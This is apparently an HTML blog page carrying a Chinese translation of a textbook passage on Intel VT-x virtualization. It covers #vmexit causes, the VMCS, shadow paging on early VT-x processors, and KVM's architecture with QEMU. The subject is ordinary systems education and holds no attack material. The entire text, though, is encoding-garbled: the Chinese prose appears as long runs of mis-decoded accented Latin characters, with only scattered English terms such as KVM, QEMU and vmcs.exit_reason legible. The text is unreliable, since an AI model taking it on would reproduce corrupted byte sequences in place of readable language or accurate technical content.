resumeæŒ‡ä»¤æ¢å¤æ‰§è¡Œã€‚è¿™ä¸ªç‰¹æƒæŒ‡ä»¤å°†çŠ¶æ€ä»å†…å­˜ä¸­çš„VMCSåŠ è½½åˆ°å¯„å­˜å™¨æ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨ä¸»æœºç¯å¢ƒå’Œå®¢æˆ·ç¯å¢ƒä¹‹é—´æ‰§è¡ŒåŸå­è½¬æ¢ã€‚ç„¶åï¼Œè™šæ‹Ÿæœºåœ¨éæ ¹æ¨¡å¼ä¸‹æ‰§è¡Œï¼Œç›´åˆ°å¿…é¡»ç”±è™šæ‹Ÿæœºç›‘è§†ç¨‹åºå¤„ç†çš„ç¬¬ä¸€ä¸ªé™·é˜±æˆ–ä¸‹ä¸€ä¸ªå¤–éƒ¨ä¸­æ–­ã€‚ä»éæ ¹æ¨¡å¼åˆ°æ ¹æ¨¡å¼çš„è¿™ç§è½¬æ¢ç§°ä¸º#vmexitã€‚</p><p>è¡¨4.1åˆ—å‡ºäº†#vmexitçš„å„ç§å¯èƒ½åŸå› ã€‚åŸå› æœ¬èº«å­˜å‚¨åœ¨ä¸€ä¸ªä¸“ç”¨å¯„å­˜å™¨ï¼ˆvmcs.exit_reasonï¼‰ä¸­ï¼Œä»¥åŠ é€Ÿæ¨¡æ‹Ÿã€‚å¯¼è‡´<strong>é€€å‡ºçš„åŸå› </strong>å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ã€‚</p><p>â€¢ å®¢æˆ·å°è¯•æ‰§è¡Œæ ¹æ¨¡å¼ç‰¹æƒæŒ‡ä»¤ï¼Œå› ä¸ºè¿™æ˜¯Popekå’ŒGoldbergå®šç†çš„åŸºæœ¬è¦æ±‚ã€‚è¿™åŒ…æ‹¬å¤§å¤šæ•°ç»å…¸ï¼ˆå³éå¯è™šæ‹ŸåŒ–ï¼‰x86æ¶æ„çš„ç‰¹æƒæŒ‡ä»¤ï¼Œä»¥åŠå¯¼è‡´å®šç†è¿è§„çš„æ•æ„Ÿä½†éç‰¹æƒçš„æŒ‡ä»¤ã€‚</p><p>â€¢ æ–°çš„vm callæŒ‡ä»¤ï¼Œæ—¨åœ¨å…è®¸éæ ¹æ¨¡å¼å’Œæ ¹æ¨¡å¼ä¹‹é—´çš„æ˜¾å¼è½¬æ¢ï¼Œç‰¹åˆ«æ˜¯ç”±å®¢æˆ·æ“ä½œç³»ç»Ÿå‘å‡ºå¹¶å‘é€åˆ°è™šæ‹Ÿæœºç›‘è§†ç¨‹åºçš„è¶…çº§è°ƒç”¨ã€‚è¿™ç±»ä¼¼äºsys enteræŒ‡ä»¤ï¼Œç”¨äºåœ¨ç”¨æˆ·æ¨¡å¼å’Œå†…æ ¸æ¨¡å¼ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</p><p>â€¢ å¼‚å¸¸æ˜¯ç”±éæ ¹æ¨¡å¼ä¸‹æ‰§è¡Œçš„ä»»ä½•æ— å®³æŒ‡ä»¤å¼•å‘çš„ï¼Œå¶ç„¶è§¦å‘é™·é˜±çš„æƒ…å†µã€‚è¿™åŒ…æ‹¬ç‰¹åˆ«æ˜¯ç”±äºé˜´å½±åˆ†é¡µã€è®¿é—®å†…å­˜æ˜ å°„çš„I/Oè®¾å¤‡æˆ–ç”±äºæ®µè¿è§„è€Œå¼•å‘çš„é¡µé¢æ•…éšœï¼ˆ#PFï¼‰æˆ–ä¸€èˆ¬æ€§æ•…éšœï¼ˆ#GPï¼‰ã€‚</p><p>â€¢ å½“æ‰©å±•é¡µé¢æ˜ å°„ï¼ˆç”±è™šæ‹Ÿæœºç›‘è§†ç¨‹åºæ§åˆ¶ï¼‰æ— æ•ˆæ—¶ï¼Œå¯¼è‡´çš„é¡µé¢æ•…éšœçš„å­é›†ç§°ä¸ºEPTè¿è§„ã€‚è¿™ä¸ªé€€å‡ºæ˜¯åœ¨å¼•å…¥æ‰©å±•åˆ†é¡µï¼ˆå‚è§ç¬¬5ç« ï¼‰æ—¶å¼•å…¥çš„ã€‚</p><p>â€¢ å½“CPUåœ¨éæ ¹æ¨¡å¼ä¸‹æ‰§è¡Œæ—¶å‘ç”Ÿçš„å¤–éƒ¨ä¸­æ–­ï¼Œä¾‹å¦‚ç”±ä¸»æœºä¸Šçš„ç½‘ç»œæˆ–ç£ç›˜I/Oå¼•å‘çš„ä¸­æ–­ã€‚è¿™äº›äº‹ä»¶å¿…é¡»ç”±è™šæ‹Ÿæœºç›‘è§†ç¨‹åºï¼ˆå¯¹äºç±»å‹1è®¾è®¡ï¼‰æˆ–ä¸»æœºæ“ä½œç³»ç»Ÿï¼ˆå¯¹äºç±»å‹2è®¾è®¡ï¼‰å¤„ç†ï¼Œå¯èƒ½å¯¹è™šæ‹Ÿæœºæœ¬èº«å…·æœ‰æˆ–ä¸å…·æœ‰ä»»ä½•å‰¯ä½œç”¨ã€‚</p><p>ä¸­æ–­çª—å£åœ¨è™šæ‹Ÿæœºå¯ç”¨ä¸­æ–­å¹¶ä¸”è™šæ‹Ÿæœºæœ‰æœªå¤„ç†ä¸­æ–­æ—¶æ‰“å¼€ã€‚åœ¨#vmexitä¹‹åï¼Œè™šæ‹Ÿæœºç›‘è§†ç¨‹åºå¯ä»¥å°†æœªå¤„ç†çš„ä¸­æ–­æ¨¡æ‹Ÿåˆ°è™šæ‹Ÿæœºä¸Šã€‚</p><p>æœ€åï¼ŒVT-xå¼•å…¥çš„ç”¨äºæ”¯æŒè™šæ‹ŸåŒ–çš„ISAæ‰©å±•ä¹Ÿæ˜¯å—æ§æ•æ„Ÿçš„ï¼Œå› æ­¤ä¼šå¯¼è‡´#vmexitï¼Œæ¯ä¸ª#vmexitéƒ½æœ‰ä¸åŒçš„é€€å‡ºåŸå› ã€‚è¿™ç§é€€å‡ºåœ¨â€œæ­£å¸¸è™šæ‹ŸåŒ–â€æœŸé—´æ°¸è¿œä¸ä¼šå‘ç”Ÿï¼Œä½†åœ¨åµŒå¥—è™šæ‹ŸåŒ–ä¸­èµ·ç€åŸºç¡€ä½œç”¨ã€‚</p><p><img src="https://img.gls.show/img/20230904190642.png"></p><p>æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´çš„è½¬æ¢åœ¨ä½“ç³»ç»“æ„ä¸Šæ˜¯åŸå­çš„ï¼šä¸€ä¸ªå•ä¸€æŒ‡ä»¤â€”â€”vmresumeâ€”â€”å°†è½¬æ¢å›éæ ¹æ¨¡å¼å¹¶å°†VMCSçŠ¶æ€åŠ è½½åˆ°å½“å‰å¤„ç†å™¨çŠ¶æ€ä¸­ã€‚åœ¨å¦ä¸€ä¸ªæ–¹å‘ä¸Šï¼Œé™·é˜±#vmexitå°†è™šæ‹ŸCPUçš„çŠ¶æ€å­˜å‚¨åˆ°VMCSçŠ¶æ€ä¸­ã€‚è™½ç„¶VMCSçŠ¶æ€ç”±ç‰¹å®šçš„å†…å­˜åŒºåŸŸæ”¯æŒï¼Œä½†ä½“ç³»ç»“æ„æ²¡æœ‰è§„å®šå¤„ç†å™¨å¿…é¡»å°†æ•´ä¸ªçŠ¶æ€æº¢å‡ºåˆ°ç¼“å­˜çš„å†…å­˜ä¸­ï¼Œè¿˜æ˜¯å¯ä»¥å°†å…¶æ¨è¿Ÿåˆ°å¤„ç†å™¨æœ¬èº«çš„å­é›†ä¸­ã€‚å› æ­¤ï¼Œå½“å‰VMCSçš„å†…å­˜çŠ¶æ€æ˜¯æœªç¡®å®šçš„ã€‚æ­¤å¤–ï¼ŒVMCSçš„å¸ƒå±€æœªå®šä¹‰ã€‚è™šæ‹Ÿæœºç›‘è§†ç¨‹åºè½¯ä»¶å¿…é¡»é€šè¿‡vmreadå’ŒvmwriteæŒ‡ä»¤å¯¹å®¢æˆ·çŠ¶æ€çš„é€‰å®šéƒ¨åˆ†è¿›è¡Œè®¿é—®ã€‚</p><h3 id="4-2-3ä¸€ä¸ªè­¦ç¤ºæ€§çš„æ•…äº‹ãƒ¼ãƒ¼è™šæ‹ŸåŒ–ä¸­å¤®å¤„ç†å™¨ä¸æ— è§†-MMU"><a href="#4-2-3ä¸€ä¸ªè­¦ç¤ºæ€§çš„æ•…äº‹ãƒ¼ãƒ¼è™šæ‹ŸåŒ–ä¸­å¤®å¤„ç†å™¨ä¸æ— è§†-MMU" class="headerlink" title="4.2.3ä¸€ä¸ªè­¦ç¤ºæ€§çš„æ•…äº‹ãƒ¼ãƒ¼è™šæ‹ŸåŒ–ä¸­å¤®å¤„ç†å™¨ä¸æ— è§† MMU"></a>4.2.3ä¸€ä¸ªè­¦ç¤ºæ€§çš„æ•…äº‹ãƒ¼ãƒ¼è™šæ‹ŸåŒ–ä¸­å¤®å¤„ç†å™¨ä¸æ— è§† MMU</h3><p>ä»Šå¤©ï¼Œæ‰€æœ‰æ”¯æŒè™šæ‹ŸåŒ–çš„å¤„ç†å™¨æ¶æ„ä¹Ÿéƒ½è™šæ‹ŸåŒ–äº†å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰ã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸æ€»æ˜¯è¿™æ ·ã€‚äº‹å®ä¸Šï¼Œç¬¬ä¸€ä»£å¸¦æœ‰VT-xçš„è‹±ç‰¹å°”CPUä»…æä¾›äº†æœ‰å…³å†…å­˜è™šæ‹ŸåŒ–çš„åŸºæœ¬æ”¯æŒã€‚åœ¨è¿™æ ·çš„è®¾è®¡ä¸­ï¼Œæ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼åˆ†åˆ«å…·æœ‰ä¸€ä¸ªä¸åŒçš„%cr3å¯„å­˜å™¨ï¼ŒæŒ‡å®šé¡µè¡¨æ ‘çš„åŸºå€ã€‚%cr3å¯„å­˜å™¨ä¼šåœ¨vm entryå’Œ#vm exitä¹‹é—´çš„æ ¹æ¨¡å¼å’Œéæ ¹æ¨¡å¼ä¹‹é—´çš„è¿‡æ¸¡ä¸­åŸå­æ›´æ–°ã€‚å› æ­¤ï¼Œè™šæ‹Ÿæœºç›‘è§†ç¨‹åºå¯ä»¥é…ç½®100%ä¸é‡å çš„åœ°å€ç©ºé—´ã€‚è¿™è§£å†³äº†å…ˆå‰è™šæ‹Ÿæœºç›‘è§†ç¨‹åºçš„åœ°å€å‹ç¼©é—®é¢˜ï¼Œå¹¶æ¶ˆé™¤äº†ä¾èµ–åˆ†æ®µæ¥ä¿æŠ¤è™šæ‹Ÿæœºç›‘è§†ç¨‹åºçš„éœ€è¦ã€‚ä½†åœ¨è¿™ç§æœ€å°åŒ–çš„è®¾è®¡ä¸­ï¼Œå†…å­˜è™šæ‹ŸåŒ–çš„å…¶ä»–æ–¹é¢éƒ½ç•™ç»™äº†è½¯ä»¶ã€‚ä¸ä¹‹å‰æ²¡æœ‰ä»»ä½•æ¶æ„æ”¯æŒçš„æ¶æ„ä¸€æ ·ï¼Œä»ç„¶æœ‰ä¸¤ç§æ–¹æ³•å¯è¡Œï¼šï¼ˆ1ï¼‰ç”¨åŒ…å«å®¿ä¸»ç‰©ç†å€¼çš„é‡å¤é¡µè¡¨é›†åˆæ¥é˜´å½±è™šæ‹Ÿæœºçš„é¡µè¡¨ï¼ˆä½¿ç”¨è™šæ‹Ÿå®¢æˆ·ç‰©ç†å€¼ï¼‰â€”â€”è¿™æ˜¯VMwareæ‰€åšçš„ï¼ˆè§Â§3.2.5ï¼‰ï¼›æˆ–è€…ï¼ˆ2ï¼‰ä¾èµ–è™šæ‹Ÿå†…å­˜å­ç³»ç»Ÿçš„åŠè™šæ‹ŸåŒ–ï¼Œå¹¶é€šçŸ¥è™šæ‹Ÿæœºç›‘è§†ç¨‹åºéªŒè¯æ‰€æœ‰æ–°æ˜ å°„ï¼ˆè§Â§3.3ï¼‰ã€‚å½“é˜´å½±é¡µè¡¨æ—¶ï¼Œè¿™ä¸ªé€‰æ‹©äº§ç”Ÿäº†ä¸¥é‡è€Œæ„æƒ³ä¸åˆ°çš„åæœã€‚ä½¿ç”¨é˜´å½±åˆ†é¡µï¼Œè‹±ç‰¹å°”å¤„ç†å™¨çš„å‰ä¸¤ä»£æœªèƒ½è§£å†³æ€§èƒ½æ ‡å‡†ï¼šè¶…è¿‡90%çš„#vmexitè¿‡æ¸¡æ˜¯ç”±äºé˜´å½±åˆ†é¡µå’Œç”±æ­¤äº§ç”Ÿçš„è™šæ‹Ÿæœºæ€§èƒ½è¾ƒæ…¢ï¼Œæ¯”ç®€å•åœ°ç¦ç”¨VT-xå¹¶ä½¿ç”¨è½¯ä»¶æŠ€æœ¯æ—¶è¦æ…¢[3]ã€‚è¿™ç§å¼‚å¸¸çš„è§£é‡Šå®é™…ä¸Šæ˜¯å¾®å¦™çš„ï¼šé˜´å½±æ“ä½œé€šè¿‡ä¿æŒç¡¬ä»¶é¡µè¡¨çš„æ˜ å°„ä¸ç”±å®¢æˆ·æ“ä½œç³»ç»Ÿåœ¨å…¶è‡ªå·±çš„é¡µè¡¨ä¸­æ‰€åšçš„æ›´æ”¹åŒæ­¥æ¥è¿›è¡Œã€‚è¯†åˆ«æ›´æ”¹çš„æœºåˆ¶æ˜¯MMUæœ¬èº«ï¼šæ‰€æœ‰å®¢æˆ·é¡µè¡¨é¡µéƒ½è¢«é™çº§ä¸ºåªè¯»æ˜ å°„ï¼Œä»¥ç¡®ä¿ä»è™šæ‹Ÿæœºåˆ°è™šæ‹Ÿæœºç›‘è§†ç¨‹åºçš„è¿‡æ¸¡ï¼Œå³åœ¨ç»å…¸æ¶æ„ä¸­çš„é™·é˜±å’Œåœ¨VT-xä¸­çš„#vmexitã€‚å› æ­¤ï¼Œå®Œå…¨ä¾èµ–ç›´æ¥æ‰§è¡Œçš„è™šæ‹Ÿæœºç›‘è§†ç¨‹åºå¿…ç„¶ä¼šå› è™šæ‹Ÿæœºå®¢æˆ·æ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿå†…å­˜æ›´æ”¹è€Œé­å—é™·é˜±ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒVMwareçš„å†…å­˜è·Ÿè¸ªæœºåˆ¶ä¾èµ–äºè‡ªé€‚åº”äºŒè¿›åˆ¶ç¿»è¯‘ï¼Œä»¥æ¶ˆé™¤ç»å¤§å¤šæ•°é¡µé¢æ•…éšœã€‚è‡ªé€‚åº”åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘æ˜¯ä¸€ç§æœ‰æ•ˆçš„æŠ€æœ¯ï¼Œå› ä¸ºå®ƒä¾èµ–äºæ“çºµé¡µè¡¨é¡¹çš„æŒ‡ä»¤çš„é«˜å±€éƒ¨æ€§ï¼Œæ¯ä¸ªæ“ä½œç³»ç»Ÿå¤§çº¦æœ‰ä¸€æ‰“è¿™æ ·çš„æŒ‡ä»¤ã€‚ä¸€æ—¦åŠ¨æ€è¯†åˆ«äº†è¿™äº›æŒ‡ä»¤ä½ç½®ï¼Œè‡ªé€‚åº”çš„é‡æ–°ç¿»è¯‘è¿‡ç¨‹å°±ç®€å•åœ°æ¨¡æ‹Ÿè¿™äº›æŒ‡ä»¤å¹¶æ›´æ–°é˜´å½±æ¡ç›®ï¼Œè€Œä¸ä¼šç›´æ¥å¼•ç”¨å†…å­˜ä½ç½®ï¼Œå› æ­¤ä¸ä¼šå¼•å‘æ˜‚è´µçš„é™·é˜±ã€‚ å¹¸è¿çš„æ˜¯ï¼Œè¿™ä¸ªå¼‚å¸¸åœ¨éšåçš„å¤„ç†å™¨ä¸­å¾—åˆ°äº†è§£å†³ã€‚</p><h2 id="4-3-KVM-ãƒ¼ãƒ¼-VT-X-çš„hypervisor"><a href="#4-3-KVM-ãƒ¼ãƒ¼-VT-X-çš„hypervisor" class="headerlink" title="4.3 KVM ãƒ¼ãƒ¼ VT-X çš„hypervisor"></a>4.3 KVM ãƒ¼ãƒ¼ VT-X çš„hypervisor</h2><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»æè¿°äº† VT-x å¼•å…¥çš„ç¡¬ä»¶æ‰©å±•ï¼Œå¹¶è®¨è®ºäº†ä¸€äº›ä½“ç³»ç»“æ„æ–¹é¢çš„æ³¨æ„äº‹é¡¹ã€‚æˆ‘ä»¬ç°åœ¨ä½¿ç”¨åŸºäº Linux çš„å†…æ ¸è™šæ‹Ÿæœº KVM [113]ä½œä¸ºå®è·µåˆ›æ–°çš„æ¡ˆä¾‹ç ”ç©¶ã€‚KVM å› å…¶æˆç†Ÿæ€§å’Œç®€å•æ€§è€Œæˆä¸ºä¸€ä¸ªæœ‰è¶£çš„ç ”ç©¶å¯¹è±¡ã€‚</p><p>KVMæ˜¯æœ€é‡è¦çš„å¼€æºç±»å‹-2è™šæ‹ŸåŒ–ç›‘è§†å™¨ä¹‹ä¸€ã€‚å®ƒåœ¨ä¼—å¤šé¡¹ç›®ã€äº‘æ‰˜ç®¡è§£å†³æ–¹æ¡ˆä¸­å¾—åˆ°åº”ç”¨ï¼Œå¹¶å¹¿æ³›éƒ¨ç½²åœ¨ä¼ä¸šå’Œç§æœ‰äº‘ä¸­ã€‚KVMæ˜¯ä¸»è¦å•†ä¸šLinuxå‘è¡Œç‰ˆå®˜æ–¹æ”¯æŒçš„è™šæ‹Ÿæœºç›‘è§†å™¨ï¼Œä¹Ÿæ˜¯å¤§å¤šæ•°OpenStackéƒ¨ç½²çš„åŸºç¡€ã€‚</p><ul><li>KVMä¾èµ–äºç‹¬ç«‹çš„å¼€æºé¡¹ç›®QEMUæ¥æ¨¡æ‹ŸI/Oã€‚åœ¨æ²¡æœ‰KVMçš„æƒ…å†µä¸‹ï¼ŒQEMUæ˜¯ä¸€ä¸ªå®Œæ•´çš„æœºå™¨æ¨¡æ‹Ÿå™¨ï¼Œæ”¯æŒå¯¹CPUçš„è·¨æ¶æ„äºŒè¿›åˆ¶ç¿»è¯‘ï¼Œä»¥åŠå®Œæ•´çš„I/Oè®¾å¤‡æ¨¡å‹ã€‚ä¸KVMä¸€èµ·ï¼Œå®ƒä»¬ç»„æˆäº†ç±»å‹-2è™šæ‹Ÿæœºç›‘è§†å™¨ï¼Œå…¶ä¸­QEMUè´Ÿè´£å¤„ç†æ‰€æœ‰I/Oå‰ç«¯è®¾å¤‡æ¨¡æ‹Ÿï¼ŒLinuxä¸»æœºè´Ÿè´£I/Oåç«¯ï¼ˆé€šè¿‡æ­£å¸¸ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œè€ŒKVMå†…æ ¸æ¨¡å—è´Ÿè´£å¤ç”¨å¤„ç†å™¨å’Œå†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰ã€‚</li><li>KVMçš„å†…æ ¸ç»„ä»¶å®ç°äº†CPUå’Œå†…å­˜è™šæ‹ŸåŒ–çš„åŠŸèƒ½ï¼Œç›¸å½“äºVMwareè™šæ‹Ÿæœºç›‘è§†å™¨ï¼ˆVMMï¼‰ã€‚è¿™äº›ç»„ä»¶å·²å†…ç½®åˆ°Linuxå†…æ ¸ä¸­ï¼Œæ—¨åœ¨é¿å…ä¸Linuxäº§ç”Ÿä¸å¿…è¦çš„å†—ä½™ã€‚KVMä»ä¸€å¼€å§‹å°±è¢«è®¾è®¡ä¸ºLinuxçš„ä¸€éƒ¨åˆ†ï¼Œæ˜ç¡®çš„ç›®æ ‡æ˜¯å°†æ‰€æœ‰å†…æ ¸é©»ç•™ç»„ä»¶åˆå¹¶åˆ°Linuxä¸»çº¿æºä»£ç æ ‘ä¸­ã€‚è¿™ä¸€ç›®æ ‡äº2007å¹´çš„Linuxç‰ˆæœ¬2.6.20ä¸­å®ç°ã€‚</li><li>ä¸Xenæˆ–VMware Workstationä¸åŒï¼ŒKVMä»ä¸€å¼€å§‹å°±å‡è®¾å­˜åœ¨ç¡¬ä»¶æ”¯æŒè™šæ‹ŸåŒ–çš„æƒ…å†µä¸‹è¿›è¡Œè®¾è®¡ã€‚è¿™æ„å‘³ç€å®ƒå……åˆ†åˆ©ç”¨äº†ç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒï¼Œå¦‚Intelçš„VT-xã€‚è¿™ä½¿å¾—KVMæˆä¸ºç ”ç©¶åŸºäºVT-xè®¾è®¡çš„è™šæ‹ŸåŒ–ç›‘è§†å™¨å†…åœ¨å¤æ‚æ€§çš„ä¸€ä¸ªç‰¹åˆ«å¥½çš„æ¡ˆä¾‹ã€‚</li></ul><p>ç»¼ä¸Šæ‰€è¿°ï¼ŒKVMæ˜¯ä¸€ä¸ªå¤‡å—æ¨å´‡çš„å¼€æºè™šæ‹Ÿæœºç›‘è§†å™¨ï¼Œå¹¿æ³›åº”ç”¨äºå„ç§é¡¹ç›®ï¼ŒåŒ…æ‹¬äº‘æ‰˜ç®¡å’Œä¼ä¸šç¯å¢ƒã€‚å®ƒä¾èµ–äºQEMUæ¥æä¾›I/Oæ¨¡æ‹Ÿï¼Œå¹¶ä¸Linuxå†…æ ¸æ·±åº¦é›†æˆï¼Œå……åˆ†åˆ©ç”¨ç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒï¼Œæˆä¸ºä¸»è¦Linuxå‘è¡Œç‰ˆçš„å®˜æ–¹æ”¯æŒè™šæ‹Ÿæœºç›‘è§†å™¨ã€‚</p><h3 id="4-3-1-å……åˆ†åˆ©ç”¨-VT-X-çš„æŒ‘æˆ˜"><a href="#4-3-1-å……åˆ†åˆ©ç”¨-VT-X-çš„æŒ‘æˆ˜" class="headerlink" title="4.3.1 å……åˆ†åˆ©ç”¨ VT-X çš„æŒ‘æˆ˜"></a>4.3.1 å……åˆ†åˆ©ç”¨ VT-X çš„æŒ‘æˆ˜</h3><p>KVMçš„å¼€å‘äººå‘˜æ ¹æ®Popekå’ŒGoldbergçš„è™šæ‹Ÿæœºä¸‰ä¸ªæ ¸å¿ƒå±æ€§è¿›è¡Œäº†å¦‚ä¸‹è°ƒæ•´ï¼š</p><p>ç­‰ä»·æ€§ï¼šKVMè™šæ‹Ÿæœºåº”èƒ½å¤Ÿè¿è¡Œä»»ä½•x86æ“ä½œç³»ç»Ÿï¼ˆ32ä½æˆ–64ä½ï¼‰åŠå…¶æ‰€æœ‰åº”ç”¨ç¨‹åºï¼Œæ— éœ€ä»»ä½•ä¿®æ”¹ã€‚KVMå¿…é¡»åœ¨ç¡¬ä»¶çº§åˆ«æä¾›è¶³å¤Ÿçš„å…¼å®¹æ€§ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥é€‰æ‹©ä»–ä»¬çš„å®¢æˆ·æ“ä½œç³»ç»Ÿå†…æ ¸å’Œå‘è¡Œç‰ˆã€‚</p><p>å®‰å…¨æ€§ï¼šKVMè™šæ‹ŸåŒ–è™šæ‹Ÿæœºå¯è§çš„æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬CPUã€ç‰©ç†å†…å­˜ã€I/Oæ€»çº¿å’Œè®¾å¤‡ä»¥åŠBIOSå›ºä»¶ã€‚å³ä½¿åœ¨å­˜åœ¨æ¶æ„æˆ–æ•…éšœçš„å®¢æˆ·æ“ä½œç³»ç»Ÿçš„æƒ…å†µä¸‹ï¼ŒKVM hypervisorå§‹ç»ˆå®Œå…¨æ§åˆ¶è™šæ‹Ÿæœºã€‚</p><p>æ€§èƒ½ï¼šKVMåº”å…·æœ‰è¶³å¤Ÿçš„é€Ÿåº¦æ¥è¿è¡Œç”Ÿäº§å·¥ä½œè´Ÿè½½ã€‚ç„¶è€Œï¼ŒKVMæ˜ç¡®è®¾è®¡ä¸ºç±»å‹-2æ¶æ„ï¼Œè¿™æ„å‘³ç€èµ„æºç®¡ç†å’Œè°ƒåº¦å†³ç­–ä½œä¸ºä¸»æœºLinuxå†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼ˆå…¶ä¸­KVMå†…æ ¸æ¨¡å—æ˜¯å…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼‰è€Œä¿ç•™ã€‚</p><p>ä¸ºå®ç°è¿™äº›ç›®æ ‡ï¼ŒKVMçš„è®¾è®¡è¿›è¡Œäº†ä»”ç»†çš„æƒè¡¡ï¼Œä»¥ç¡®ä¿æ‰€æœ‰æ€§èƒ½å…³é”®ç»„ä»¶éƒ½åœ¨KVMå†…æ ¸æ¨¡å—å†…å¤„ç†ï¼ŒåŒæ—¶é™åˆ¶äº†è¯¥å†…æ ¸æ¨¡å—çš„å¤æ‚æ€§ã€‚å…·ä½“æ¥è¯´ï¼ŒKVMå†…æ ¸æ¨¡å—ä»…å¤„ç†ä¸x86å¤„ç†å™¨çš„ä»¿çœŸã€å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰ã€ä¸­æ–­å­ç³»ç»Ÿï¼ˆåŒ…æ‹¬APICã€IOAPICç­‰ï¼‰çš„ä»¿çœŸç›¸å…³çš„æ ¸å¿ƒå¹³å°åŠŸèƒ½ï¼›æ‰€æœ‰è´Ÿè´£I/Oä»¿çœŸçš„åŠŸèƒ½éƒ½åœ¨ç”¨æˆ·ç©ºé—´å¤„ç†ã€‚</p><p>ä¸ºäº†è¿›ä¸€æ­¥ç®€åŒ–å®ç°ï¼ŒKVMçš„åŸå§‹ç‰ˆæœ¬é«˜åº¦åˆ©ç”¨äº†ä¸¤ä¸ªç°æœ‰çš„å¼€æºé¡¹ç›®ï¼šï¼ˆiï¼‰QEMUç”¨äºç”¨æˆ·ç©ºé—´ä¸­çš„æ‰€æœ‰I/Oä»¿çœŸï¼Œä»¥åŠï¼ˆiiï¼‰Xençš„x86ç‰¹å®šéƒ¨åˆ†ï¼Œå®ƒä½œä¸ºLinuxå†…æ ¸æ¨¡å—çš„èµ·ç‚¹ã€‚æ­¤åï¼ŒKVMå’ŒXenåŸºæœ¬ä¸Šèµ°ä¸Šäº†ä¸åŒçš„é“è·¯ï¼Œä½†QEMUçš„æ¼”è¿›ä¸»è¦å—åˆ°å¯¹KVMçš„è¦æ±‚é©±åŠ¨ã€‚</p><h3 id="4-3-2-THE-KVM-KERNEL-MODULE"><a href="#4-3-2-THE-KVM-KERNEL-MODULE" class="headerlink" title="4.3.2 THE KVM KERNEL MODULE"></a>4.3.2 THE KVM KERNEL MODULE</h3><p><img src="https://img.gls.show/img/20230904194731.png"></p><p>KVMçš„å†…æ ¸æ¨¡å—ä»…å¤„ç†åŸºæœ¬çš„CPUå’Œå¹³å°ä»¿çœŸé—®é¢˜ã€‚è¿™åŒ…æ‹¬CPUä»¿çœŸã€å†…å­˜ç®¡ç†å’ŒMMUè™šæ‹ŸåŒ–ã€ä¸­æ–­è™šæ‹ŸåŒ–ä»¥åŠä¸€äº›èŠ¯ç‰‡ç»„ä»¿çœŸï¼ˆå¦‚APICã€IOAPICç­‰ï¼‰ã€‚ä½†å®ƒä¸åŒ…æ‹¬æ‰€æœ‰<strong>I/Oè®¾å¤‡ä»¿çœŸ</strong>ã€‚</p><p>è€ƒè™‘åˆ°KVMä»…è®¾è®¡ç”¨äºéµå¾ªPopek/GoldbergåŸåˆ™çš„å¤„ç†å™¨ï¼Œç†è®ºä¸Šè®¾è®¡æ˜¯ç®€å•æ˜äº†çš„ï¼šï¼ˆiï¼‰é€‚å½“é…ç½®ç¡¬ä»¶ï¼›ï¼ˆiiï¼‰è®©è™šæ‹Ÿæœºç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼›ï¼ˆiiiï¼‰åœ¨ç¬¬ä¸€æ¬¡é™·å…¥æˆ–ä¸­æ–­æ—¶ï¼Œè™šæ‹Ÿæœºç›‘è§†ç¨‹åºç„¶åé‡æ–°è·å¾—æ§åˆ¶æƒï¼Œå¹¶â€œåªæ˜¯â€æ ¹æ®è¯­ä¹‰ä»¿çœŸé™·å…¥çš„æŒ‡ä»¤ã€‚</p><p>ç„¶è€Œï¼Œå®é™…æƒ…å†µè¦å¤æ‚å¾—å¤šã€‚æˆ‘ä»¬çš„åˆ†æåŸºäº2016å¹´10æœˆçš„linux-4.8ç‰ˆæœ¬ã€‚KVMå†…æ ¸æ¨¡å—æœ¬èº«æœ‰è¶…è¿‡25,000è¡Œæºä»£ç ï¼ˆLOCï¼‰ã€‚è¿™ç§å¤æ‚æ€§éƒ¨åˆ†åŸå› åœ¨äºï¼šï¼ˆiï¼‰éœ€è¦æ”¯æŒè¿½æº¯åˆ°é¦–æ¬¾å…·æœ‰VT-xï¼ˆIntelçš„Prescottï¼‰çš„å¤„ç†å™¨çš„å¤šä¸ªä¸åŒç‰ˆæœ¬ï¼›ï¼ˆiiï¼‰x86æŒ‡ä»¤é›†æ¶æ„çš„å›ºæœ‰å¤æ‚æ€§ï¼›ï¼ˆiiiï¼‰ç¡¬ä»¶ä¸­ä»ç„¶ç¼ºä¹å¯¹ä¸€äº›åŸºæœ¬æ“ä½œçš„æ¶æ„æ”¯æŒï¼Œè¿™äº›æ“ä½œå¿…é¡»åœ¨è½¯ä»¶ä¸­å¤„ç†ã€‚</p><p>å›¾4.3è¯´æ˜äº†KVMé™·å…¥å¤„ç†é€»è¾‘çš„å…³é”®æ­¥éª¤ï¼Œä»æœ€åˆçš„#vmexitåˆ°vmresumeæŒ‡ä»¤è¿”å›éæ ¹æ¨¡å¼ã€‚åœ¨#vmexitä¹‹åç«‹å³ï¼ŒKVMé¦–å…ˆå°†æ‰€æœ‰vcpuçŠ¶æ€ä¿å­˜åœ¨å†…å­˜ä¸­ã€‚è‹±ç‰¹å°”ä½“ç³»ç»“æ„æ‰‹å†Œå®šä¹‰äº†54ç§å¯èƒ½çš„é€€å‡ºåŸå› ï¼ˆè§è¡¨4.1ï¼‰ã€‚ç„¶åï¼ŒKVMæ 